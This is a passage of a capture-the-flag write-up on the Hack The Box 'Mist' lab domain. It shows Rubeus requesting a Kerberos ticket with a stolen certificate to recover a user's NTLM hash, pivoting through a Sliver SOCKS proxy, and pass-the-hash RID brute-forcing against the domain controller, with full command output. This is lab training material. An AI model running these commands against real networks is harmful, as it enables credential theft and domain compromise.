[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

- get nthash of brandon.keywarp
```
sliver (GRATEFUL_PERCH) > rubeus asktgt /user:brandon.keywarp /certificate:cert.pfx /getcredentials /show /nowarp

[*] rubeus output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 

[*] Action: Ask TGT

[*] Got domain: mist.htb
[*] Using PKINIT with etype rc4_hmac and subject: CN=Brandon.Keywarp, CN=Users, DC=mist, DC=htb 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'mist.htb\brandon.keywarp'
[*] Using domain controller: 192.168.100.100:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      Lmh0Yg==

  ServiceName              :  krbtgt/mist.htb
  ServiceRealm             :  MIST.HTB
  UserName                 :  brandon.keywarp (NT_PRINCIPAL)
  UserRealm                :  MIST.HTB
  StartTime                :  4/22/2025 10:59:22 AM
  EndTime                  :  4/22/2025 8:59:22 PM
  RenewTill                :  4/29/2025 10:59:22 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  zh449FMvfz8Z582ik5VO4w==
  ASREP (key)              :  7838D49BEE53789625E15EAF1E0E9454

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : DB03D6A77A2205BC1D07082740626CC9
```


#### accessing AD server throught socks proxy on brandon.keywarp user

```
sliver (GRATEFUL_PERCH) > socks5 start

[*] Started SOCKS5 127.0.0.1 1081  
⚠  In-band SOCKS proxies can be a little unstable depending on protocol

sliver (GRATEFUL_PERCH) > socks5 

 ID   Session ID                             Bind Address     Username   Passwords 
==== ====================================== ================ ========== ===========
  1   52321b04-f9e3-4ade-8877-634f23218555   127.0.0.1:1081 
```

```
└─$ proxychains netexec ldap 192.168.100.100 -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.100:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.100:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.100:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.100:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.100:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.100:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.100:389  ...  OK
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
LDAP        192.168.100.100 389    DC01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9 
```


```
└─$ proxychains -q netexec smb 192.168.100.100 -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 --rid-brute
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
SMB         192.168.100.100 445    DC01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9 
SMB         192.168.100.100 445    DC01             498: MIST\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         192.168.100.100 445    DC01             500: MIST\Administrator (SidTypeUser)
SMB         192.168.100.100 445    DC01             501: MIST\Guest (SidTypeUser)
SMB         192.168.100.100 445    DC01             502: MIST\krbtgt (SidTypeUser)
SMB         192.168.100.100 445    DC01             512: MIST\Domain Admins (SidTypeGroup)
SMB         192.168.100.100 445    DC01             513: MIST\Domain Users (SidTypeGroup)
SMB         192.168.100.100 445    DC01             514: MIST\Domain Guests (SidTypeGroup)
SMB         192.168.100.100 445    DC01             515: MIST\Domain Computers (SidTypeGroup)
SMB         192.168.100.100 445    DC01             516: MIST\Domain Controllers (SidTypeGroup)
SMB         192.168.100.100 445    DC01             517: MIST\Cert Publishers (SidTypeAlias)
SMB         192.168.100.100 445    DC01             518: MIST\Schema Admins (SidTypeGroup)
SMB         192.168.100.100 445    DC01             519: MIST\Enterprise Admins (SidTypeGroup)
SMB         192.168.100.100 445    DC01             520: MIST\Group Policy Creator Owners (SidTypeGroup)
SMB         192.168.100.100 445    DC01             521: MIST\Read-only Domain Controllers (SidTypeGroup)
SMB         192.168.100.100 445    DC01             522: MIST\Cloneable Domain Controllers (SidTypeGroup)
SMB         192.168.100.100 445    DC01             525: MIST\Protected Users (SidTypeGroup)
SMB         192.168.100.100 445    DC01             526: MIST\Key Admins (SidTypeGroup)
SMB         192.168.100.100 445    DC01             527: MIST\Enterprise Key Admins (SidTypeGroup)
SMB         192.168.100.100 445    DC01             553: MIST\RAS and IAS Servers (SidTypeAlias)
SMB         192.168.100.100 445    DC01             571: MIST\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         192.168.100.100 445    DC01             572: MIST\Denied RODC Password Replication Group (SidTypeAlias)
SMB         192.168.100.100 445    DC01             1000: MIST\DC01$ (SidTypeUser)
SMB         192.168.100.100 445    DC01             1101: MIST\DnsAdmins (SidTypeAlias)
SMB         192.168.100.100 445    DC01             1102: MIST\DnsUpdateProxy (SidTypeGroup)
SMB         192.168.100.100 445    DC01             1108: MIST\MS01$ (SidTypeUser)
SMB         192.168.100.100 445    DC01             1109: MIST\Sharon.Mullard (SidTypeUser)
SMB         192.168.100.100 445    DC01             1110: MIST\Brandon.Keywarp (SidTypeUser)
SMB         192.168.100.100 445    DC01             1111: MIST\Florence.Brown (SidTypeUser)
SMB         192.168.100.100 445    DC01             1112: MIST\Jonathan.Clinton (SidTypeUser)
SMB         192.168.100.100 445    DC01             1113: MIST\Markus.Roheb (SidTypeUser)
SMB         192.168.100.100 445    DC01             1114: MIST\Shivangi.Sumpta (SidTypeUser)
SMB         192.168.100.100 445    DC01             1115: MIST\Harry.Beaucorn (SidTypeUser)
SMB         192.168.100.100 445    DC01             1118: MIST\ServiceAccounts (SidTypeGroup)
SMB         192.168.100.100 445    DC01             1121: MIST\Operatives (SidTypeGroup)
SMB         192.168.100.100 445    DC01             1122: MIST\op_Sharon.Mullard (SidTypeUser)
SMB         192.168.100.100 445    DC01             1123: MIST\op_Markus.Roheb (SidTypeUser)
SMB         192.168.100.100 445    DC01             1124: MIST\svc_ca$ (SidTypeUser)
SMB         192.168.100.100 445    DC01             1125: MIST\svc_smb (SidTypeUser)
SMB         192.168.100.100 445    DC01             1126: MIST\Certificate Managers (SidTypeGroup)
SMB         192.168.100.100 445    DC01             1131: MIST\Virtualization Services (SidTypeGroup)
SMB         192.168.100.100 445    DC01             1132: MIST\Certificate Services (SidTypeGroup)
SMB         192.168.100.100 445    DC01             1134: MIST\CA Backup (SidTypeGroup)
SMB         192.168.100.100 445    DC01             1135: MIST\svc_cabackup (SidTypeUser)

```

```
MIST\Administrator 
MIST\Guest 
MIST\krbtgt 
MIST\DC01$ 
MIST\MS01$ 
MIST\Sharon.Mullard 
MIST\Brandon.Keywarp 
MIST\Florence.Brown 
MIST\Jonathan.Clinton 
MIST\Markus.Roheb 
MIST\Shivangi.Sumpta 
MIST\Harry.Beaucorn 
MIST\op_Sharon.Mullard 
MIST\op_Markus.Roheb 
MIST\svc_ca$ 
MIST\svc_smb 
MIST\svc_cabackup
```
